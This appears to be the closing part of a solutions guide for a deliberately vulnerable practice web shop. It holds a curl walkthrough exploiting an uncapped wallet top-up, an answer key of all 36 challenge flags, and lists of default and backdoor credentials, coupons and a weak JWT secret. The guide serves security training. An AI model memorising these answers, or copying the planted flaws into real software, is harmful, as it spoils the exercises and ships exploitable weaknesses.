| **Difficulty** | Medium (200 pts) |
| **Flag** | `VJS{1nt3g3r_0v3rfl0w_w4ll3t}` |

**Vulnerability:** The wallet top-up endpoint does not cap the amount, allowing extremely large values that overflow.

**How to solve:**

```bash
TOKEN=$(curl -s -X POST http://localhost:2212/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"john@juice.local","password":"password"}' | jq -r '.token')

# Top up with an extremely large amount
curl -s -X POST http://localhost:2212/api/users/wallet/topup \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount":9007199254740991}' | jq
```

The server detects `amount > 1000000` and returns `flag_overflow`.

**Vulnerable code:** `server/routes/users.js:105-124` — no upper bound validation on `amount`.

---

## Quick Reference: All Flags

| # | Challenge | Difficulty | Flag |
|---|-----------|------------|------|
| 1 | IDOR - View Profile | Easy | `VJS{1d0r_pr0f1le_4cc3ss}` |
| 2 | Admin Section Access | Medium | `VJS{4dm1n_p4n3l_byp4ss}` |
| 3 | Forged Review | Medium | `VJS{f0rg3d_r3v13w_1d0r}` |
| 4 | Horizontal Privilege Escalation | Hard | `VJS{h0r1z0nt4l_pr1v_3sc}` |
| 5 | CSRF Wallet Transfer | Medium | `VJS{csrf_w4ll3t_dr41n}` |
| 6 | Server-Side Request Forgery | Hard | `VJS{ssrf_1nt3rn4l_4cc3ss}` |
| 7 | Verbose Error Messages | Easy | `VJS{v3rb0s3_3rr0r_l34k}` |
| 8 | Directory Traversal | Medium | `VJS{d1r3ct0ry_tr4v3rs4l}` |
| 9 | Default Credentials | Medium | `VJS{d3f4ult_cr3ds_b4ckd00r}` |
| 10 | Hidden Page Discovery | Easy | `VJS{r0b0ts_txt_s3cr3t}` |
| 11 | XML External Entity | Hard | `VJS{xx3_f1l3_r34d}` |
| 12 | Outdated Dependencies | Easy | `VJS{vuln3r4bl3_d3ps_f0und}` |
| 13 | Exposed Lockfile | Easy | `VJS{l0ckf1l3_3xp0s3d}` |
| 14 | Prototype Pollution | Hard | `VJS{pr0t0typ3_p0llut10n}` |
| 15 | Weak Password Hashing | Medium | `VJS{md5_n0_s4lt_cr4ck}` |
| 16 | Exposed API Docs | Easy | `VJS{3xp0s3d_4p1_d0cs}` |
| 17 | Weak JWT Secret | Hard | `VJS{w34k_jwt_s3cr3t}` |
| 18 | SQL Injection - Login Bypass | Easy | `VJS{sql_inject10n_l0gin_byp4ss}` |
| 19 | SQL Injection - Search | Medium | `VJS{un10n_s3lect_m4ster}` |
| 20 | SQL Injection - Order Lookup | Hard | `VJS{0rder_sql1_exf1ltr4t10n}` |
| 21 | Reflected XSS | Easy | `VJS{r3flect3d_xss_p0p}` |
| 22 | Stored XSS | Medium | `VJS{st0r3d_xss_r3v13w}` |
| 23 | DOM-based XSS | Hard | `VJS{d0m_xss_fr4gm3nt}` |
| 24 | Null Byte Injection | Hard | `VJS{null_byt3_1nj3ct}` |
| 25 | NoSQL-style Injection | Hard | `VJS{n0sql_0p3r4t0r_1nj}` |
| 26 | Unrestricted File Upload | Medium | `VJS{unr3str1ct3d_upl04d}` |
| 27 | Mass Assignment | Medium | `VJS{m4ss_4ss1gn_r0l3}` |
| 28 | Race Condition | Hard | `VJS{r4c3_c0nd1t10n_c0up0n}` |
| 29 | Weak Admin Password | Easy | `VJS{w34k_4dm1n_p4ssw0rd}` |
| 30 | JWT None Algorithm | Hard | `VJS{jwt_n0n3_4lg0_f0rg3}` |
| 31 | Broken Password Reset | Medium | `VJS{br0k3n_p4ss_r3s3t}` |
| 32 | Unsigned Data Integrity | Medium | `VJS{d4t4_1nt3gr1ty_f41l}` |
| 33 | Missing Security Logs | Medium | `VJS{n0_l0gg1ng_0r_4l3rt}` |
| 34 | Negative Quantity Order | Easy | `VJS{n3g4t1v3_qu4nt1ty_cr3d1t}` |
| 35 | Type Confusion | Medium | `VJS{typ3_c0nfus10n_3rr0r}` |
| 36 | Integer Overflow | Medium | `VJS{1nt3g3r_0v3rfl0w_w4ll3t}` |

---

## Default Accounts

| Username | Email | Password | Role |
|----------|-------|----------|------|
| admin | admin@vegetarian-juice.shop | admin123 | admin |
| john | john@juice.local | password | customer |
| jane | jane@juice.local | qwerty123 | customer |
| bob | bob@juice.local | bob2024 | customer |
| alice | alice@juice.local | alice! | customer |
| support | support@vegetarian-juice.shop | sup0rt!@# | support |
| deluxe_member | deluxe@juice.local | deluxe | deluxe |
| bender | bender@juice.local | BendMe! | customer |
| wurstbot (backdoor) | wurstbot@vegetarian-juice.shop | VeggieBot2024! | admin |

## Coupon Codes

| Code | Discount | Active |
|------|----------|--------|
| VEGGIE10 | 10% | Yes |
| WELCOME20 | 20% | Yes |
| EXPIRED50 | 50% | No |
| ADMIN100 | 100% | Yes (hidden) |
| NULL | 90% | Yes |

## Key Application Secrets

| Secret | Value |
|--------|-------|
| JWT Signing Key | `vegetarian-juice-secret-key` |
| Password Hash Algorithm | MD5 (unsalted) |
| Database | SQLite3 (better-sqlite3) |
